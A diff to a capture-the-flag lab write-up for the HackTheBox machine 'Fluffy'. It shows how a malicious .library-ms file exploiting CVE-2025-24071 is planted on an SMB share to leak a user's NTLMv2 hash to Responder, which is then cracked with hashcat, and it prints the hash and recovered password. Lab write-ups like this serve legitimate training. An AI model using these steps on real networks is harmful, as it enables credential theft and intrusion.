@@ -134,5 +134,31 @@ Enter the password when prompted and we list the contents of the share. After tu
 
 <img width="1142" height="946" alt="image" src="https://github.com/user-attachments/assets/491ea959-3c79-4579-a75e-eb1b6bd329a0" />
 
-6. 
+6. We look into each CVE, starting from the most critical one and CVE-2025-24071 looks very promising.
 
+This CVE exploits a NTLM leak where opening a malicious `.library-ms` triggers an SMB connection to the server specified. This leads to the NTLM hash of the user being leaked to the attacker. We download this PoC from github: https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
+
+7. After running the Python PoC script and entering our local IP, we get a `xd.library-ms` file pointing to our machine. Now we will exploit the CVE with the following steps:
+
+I. Run responder: `sudo responder -I tun0`
+II. Connect to IT SMB share, entering the given password when prompted: `smbclient -U j.fleischman //fluffy.htb/IT`
+III. Upload the `xd.library-ms` file: `put xd.library-ms`
+IV. Wait until we get the NTLM hash on Responder
+
+<img width="1610" height="840" alt="image" src="https://github.com/user-attachments/assets/7639d4f2-fb2b-48de-843b-9525fa74f0c5" />
+
+We got p.agila's NTLMv2 hash!
+
+```
+p.agila::FLUFFY:fa2cb766a8c2197b:AE6CEE0CEDAA5F61939E43B49E65C9A0:0101000000000000800F0B6D78A6DC01F5D038DEC5EB4E7300000000020008004E00390034005A0001001E00570049004E002D004B00520045004E00520050005500390058005300550004003400570049004E002D004B00520045004E0052005000550039005800530055002E004E00390034005A002E004C004F00430041004C00030014004E00390034005A002E004C004F00430041004C00050014004E00390034005A002E004C004F00430041004C0007000800800F0B6D78A6DC01060004000200000008003000300000000000000001000000002000005F78776134D3E95B3AD207CF55F9D90735116665981DB9FF5568746267CF3DA70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100360033000000000000000000
+```
+
+8. Let's try to crack this hash using Hashcat:
+
+`hashcat -m 5600 p.agila.ntlmv2_hash /usr/share/wordlists/rockyou.txt`
+
+We get the creds: `p.agila:prometheusx-303`
+
+9. 
+
+9. 
